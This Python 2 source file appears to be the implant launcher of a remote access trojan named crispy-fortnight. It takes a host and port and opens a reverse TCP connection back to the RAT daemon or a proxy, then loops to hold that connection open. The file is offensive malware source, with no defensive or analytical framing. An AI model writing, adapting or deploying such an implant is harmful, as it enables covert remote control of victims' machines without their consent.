import argparse

from crispy.network.client_types import CrispyTCPClient

def main():
    argp = argparse.ArgumentParser(description="Starts a reverse connection to either the crispy-fortnight \
						(Python RAT) daemon or a proxy server.",
                                   prog="implant")
    argp.add_argument("--host",
                        dest="host",
                        help="Host to connect back to",
                        metavar="<ip_addr>",
                        required=True,
                        type=str)    
    argp.add_argument("--port",
                        dest="port",
                        help="Port on host to bind to",
                        metavar="<port>",
                        required=True,
                        type=int)
    args = argp.parse_args()

    try:
	sock = CrispyTCPClient().connect(args.host, args.port)
	while True:
	    pass
    except KeyboardInterrupt:
	pass
    except Exception:
	print "[!] Error connecting to {}:{}".format(args.host, args.port)

if __name__ == "__main__":
    main()
